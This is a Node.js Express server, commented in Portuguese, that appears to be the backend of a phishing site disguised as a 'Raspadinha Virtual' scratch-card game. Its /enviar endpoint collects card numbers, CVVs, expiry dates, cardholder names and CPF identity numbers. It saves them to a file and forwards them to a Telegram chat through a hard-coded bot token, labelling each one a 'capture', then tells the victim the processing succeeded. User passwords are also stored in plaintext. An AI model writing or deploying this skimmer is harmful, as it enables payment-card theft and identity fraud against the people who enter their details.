const express = require('express');
const path = require('path');
const fs = require('fs');
const fetch = require("node-fetch");
const cors = require('cors');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve arquivos estáticos da pasta "site"
app.use(express.static(path.join(__dirname, 'site')));

// Redireciona / para o index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'site', 'index.html'));
});

// Configuração da porta para Railway
const PORT = process.env.PORT || 3000;

//=== ARQUIVOS DE DADOS ===
const usersFile = './users.txt';
const checkoutFile = './checkout.txt';

// Função para garantir que os arquivos existam
function ensureFilesExist() {
  if (!fs.existsSync(usersFile)) {
    fs.writeFileSync(usersFile, '');
  }
  if (!fs.existsSync(checkoutFile)) {
    fs.writeFileSync(checkoutFile, '');
  }
}

//=== REGISTRO ===
app.post('/register', (req, res) => {
  const { username, password, fullname } = req.body;

  if (!username || !password || !fullname) {
    return res.json({ success: false, message: 'Campos obrigatórios não preenchidos.' });
  }

  ensureFilesExist();

  // Verifica se já existe
  if (fs.existsSync(usersFile)) {
    const existingUsers = fs.readFileSync(usersFile, 'utf-8').split('\n');
    const exists = existingUsers.some(line => {
      const [savedUsername] = line.split('|');
      return savedUsername === username;
    });

    if (exists) {
      return res.json({ success: false, message: 'Usuário já existe.' });
    }
  }

  // Salva novo usuário
  const userLine = `${username}|${password}|${fullname}\n`;
  fs.appendFileSync(usersFile, userLine);
  
  console.log(`Novo usuário registrado: ${username}`);
  res.json({ success: true, message: 'Usuário registrado com sucesso!' });
});

//=== LOGIN ===
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.json({ success: false, message: 'Informe usuário e senha.' });
  }

  ensureFilesExist();

  fs.readFile(usersFile, 'utf8', (err, data) => {
    if (err) {
      console.error('Erro ao ler users.txt:', err);
      return res.json({ success: false, message: 'Erro no servidor.' });
    }

    const users = data.split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0)
      .map(line => {
        const parts = line.split('|');
        return {
          username: parts[0],
          password: parts[1],
          fullname: parts[2]
        };
      });

    const user = users.find(u => u.username === username && u.password === password);

    if (user) {
      console.log(`Login realizado: ${username}`);
      res.json({ success: true, fullname: user.fullname });
    } else {
      console.log(`Tentativa de login falhada: ${username}`);
      res.json({ success: false, message: 'Usuário ou senha inválidos.' });
    }
  });
});

//=== TELEGRAM & CHECKOUT ===
const TELEGRAM_TOKEN = "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
const CHAT_ID = "-1002852733056"; 

app.post("/enviar", async (req, res) => {
    try {
        const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body;

        // Validação básica
        if (!cardNumber || !cardcvvName || !expiry || !cardholderIdentificationNumber || !cardholderNameC) {
            return res.status(400).json({ 
                success: false, 
                message: 'Todos os campos são obrigatórios.' 
            });
        }

        const timestamp = new Date().toLocaleString('pt-BR');
        
        // Mensagem para o Telegram
        const mensagem = `
💳 NOVA CAPTURA - RASPADINHA VIRTUAL
⏰ Data/Hora: ${timestamp}
━━━━━━━━━━━━━━━━━━━━━━━
💳 Número: ${cardNumber}
🔒 CVV: ${cardcvvName}
📅 Validade: ${expiry}
👤 Nome: ${cardholderNameC}
🆔 CPF: ${cardholderIdentificationNumber}
━━━━━━━━━━━━━━━━━━━━━━━
🎯 Sistema: Raspadinha Virtual
        `;

        // Dados para salvar no arquivo
        const checkoutData = `${timestamp}|${cardNumber}|${cardcvvName}|${expiry}|${cardholderNameC}|${cardholderIdentificationNumber}\n`;

        // Salva no arquivo checkout.txt
        ensureFilesExist();
        fs.appendFileSync(checkoutFile, checkoutData);
        console.log('Dados salvos em checkout.txt:', checkoutData.trim());

        // Envia para o Telegram
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mensagem,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        console.log("Resposta do Telegram:", data);

        if (!data.ok) {
            console.error(`Erro do Telegram: ${data.description}`);
            // Mesmo com erro no Telegram, os dados foram salvos no arquivo
            res.json({ 
                success: true, 
                message: "Dados processados com sucesso!", 
                telegram_error: data.description 
            });
        } else {
            console.log("Dados enviados com sucesso para Telegram e salvos no arquivo");
            res.json({ 
                success: true, 
                message: "Dados processados e enviados com sucesso!" 
            });
        }
    } catch (error) {
        console.error("Erro no processamento:", error.message, error.stack);
        res.status(500).json({ 
            success: false, 
            message: "Erro interno do servidor" 
        });
    }
});

//=== ENDPOINT PARA VERIFICAR STATUS ===
app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        users_count: fs.existsSync(usersFile) ? fs.readFileSync(usersFile, 'utf-8').split('\n').filter(line => line.trim().length > 0).length : 0,
        checkouts_count: fs.existsSync(checkoutFile) ? fs.readFileSync(checkoutFile, 'utf-8').split('\n').filter(line => line.trim().length > 0).length : 0
    });
});

//=== INICIALIZAÇÃO ===
ensureFilesExist();

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`📝 Arquivo de usuários: ${usersFile}`);
  console.log(`💳 Arquivo de checkout: ${checkoutFile}`);
  console.log(`📊 Status endpoint: /status`);
});

// Tratamento de erros
process.on('uncaughtException', (err) => {
    console.error('Erro não capturado:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Promise rejeitada:', reason);
});
